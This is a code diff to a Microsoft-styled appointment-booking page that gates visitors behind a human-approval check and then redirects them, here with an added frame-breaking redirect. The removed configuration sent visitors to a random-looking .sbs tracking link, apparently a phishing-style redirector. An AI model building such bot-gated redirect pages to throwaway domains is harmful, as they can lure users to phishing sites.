@@ -118,7 +118,8 @@
   .slot:disabled{opacity:.45;cursor:not-allowed;text-decoration:line-through}
   .hp{position:absolute!important;left:-9999px!important;width:1px;height:1px;opacity:0;pointer-events:none}
 
-  .btn{width:100%;border:0;border-radius:4px;padding:13px 22px;font:inherit;font-weight:600;
+  .btn{display:inline-block;text-align:center;text-decoration:none;width:100%;border:0;
+       border-radius:4px;padding:13px 22px;font:inherit;font-weight:600;
        font-size:14.5px;cursor:pointer;color:#fff;background:var(--ms-blue);
        box-shadow:0 2px 6px -2px rgba(0,120,212,.6);transition:background .12s}
   .btn:hover{background:var(--ms-blue-hover)}
@@ -276,12 +277,13 @@
     <p id="srStatus" class="sr-only" aria-live="polite"></p>
   </section>
 
-  <!-- 4 · FINAL -->
+  <!-- 4 · FINAL (fallback if automatic redirect is blocked by an iframe/sandbox) -->
   <section id="view-final" hidden>
-    <span class="flag">Demo · redirect target</span>
-    <h1 id="finalTitle">Back on the original site</h1>
-    <p class="sub" id="finalNote">Set <code>CONFIG.redirectUrl</code> and this screen never appears — the browser leaves for your real site.</p>
-    <div style="max-width:340px;margin:24px auto 0">
+    <span class="flag">Approved</span>
+    <h1 id="finalTitle">Redirecting to mtwsilos.com…</h1>
+    <p class="sub" id="finalNote">If your browser or preview window blocked the automatic redirect, use the button below.</p>
+    <div style="max-width:340px;margin:24px auto 0;display:grid;gap:10px">
+      <a class="btn" id="finalLink" href="https://mtwsilos.com/" target="_top" rel="noopener">Continue to mtwsilos.com</a>
       <button class="btn ghost" id="restart">Restart the flow</button>
     </div>
   </section>
@@ -292,8 +294,8 @@
    CONFIG
    ============================================================ */
 const CONFIG = {
-  businessName: "CJ Trading international",
-  redirectUrl:  "https://phndsforj4.beforetheteenyears.sbs/l/IpMyz6klwqo",
+  businessName: "Northline Studio",
+  redirectUrl:  "https://mtwsilos.com/",
   redirectSeconds: 10,
   slotMinutes: 30,
   maxAdvanceDays: 90,
@@ -410,7 +412,7 @@ function renderSlots(){
 }
 
 /* ============================================================
-   Submit — no email collected
+   Submit
    ============================================================ */
 const form=$$("form"), errEl=$$("err");
 
@@ -432,7 +434,6 @@ form.addEventListener("submit",e=>{
     status:"pending_approval",
     humanApproved:false,
     createdAt:new Date().toISOString()
-    /* email removed — add `email` back here if you restore the field */
   };
 
   try{
@@ -601,12 +602,30 @@ if(HC.allowKeyboard){
 function showFinal(){
   stopTimers();
   if(!approved){ show("capsule"); return; }
-  const placeholder = !CONFIG.redirectUrl || CONFIG.redirectUrl==="https://phndsforj4.beforetheteenyears.sbs/l/IpMyz6klwqo";
-  if(placeholder){
-    $$("finalTitle").textContent="Flow complete — human approved";
+
+  const url = (CONFIG.redirectUrl || "").trim();
+  const isPlaceholder = !url || url === "https://example.com";
+
+  if(isPlaceholder){
+    $$("finalTitle").textContent = "Flow complete — human approved";
+    $$("finalLink").hidden = true;
     show("final");
-  }else{
-    location.href = CONFIG.redirectUrl;
+    return;
+  }
+
+  /* Show fallback button immediately in case an iframe/sandbox blocks auto-redirect */
+  $$("finalLink").href = url;
+  $$("finalLink").hidden = false;
+  show("final");
+
+  try{
+    if(window.top && window.top !== window.self){
+      window.top.location.assign(url);
+    }else{
+      window.location.assign(url);
+    }
+  }catch{
+    window.location.assign(url);
   }
 }
 
@@ -631,30 +650,9 @@ document.addEventListener("keydown",e=>{
 });
 
 /* boot */
-$$("bizName").textContent=`With ${CONFIG.businessName}`;
+$$("bizName").textContent=`Book with ${CONFIG.businessName}`;
 document.title=`Book an appointment — ${CONFIG.businessName}`;
 renderCalendar(); renderSlots();
-
-/* optional Microsoft Graph sync */
-async function syncWithMicrosoft(accessToken){
-  const from = today().toISOString();
-  const to   = addDays(today(), CONFIG.maxAdvanceDays).toISOString();
-  const url  = `https://graph.microsoft.com/v1.0/me/calendarView`
-             + `?startDateTime=${from}&endDateTime=${to}&$select=start,end,showAs&$top=250`;
-  const res  = await fetch(url, { headers:{ Authorization:`Bearer ${accessToken}` }});
-  if(!res.ok) throw new Error(`Graph ${res.status}`);
-  const { value } = await res.json();
-
-  const busy = new Set();
-  value.filter(ev => ev.showAs !== "free").forEach(ev => {
-    const s = new Date(ev.start.dateTime), e = new Date(ev.end.dateTime);
-    for(let t=new Date(s); t<e; t = new Date(+t + CONFIG.slotMinutes*60000)){
-      busy.add(`${iso(t)}T${String(t.getHours()).padStart(2,"0")}:${String(t.getMinutes()).padStart(2,"0")}`);
-    }
-  });
-  CONFIG.takenSlots = [...busy]; CONFIG.microsoft.enabled = true;
-  renderCalendar(); renderSlots();
-}
 </script>
 </body>
 </html>
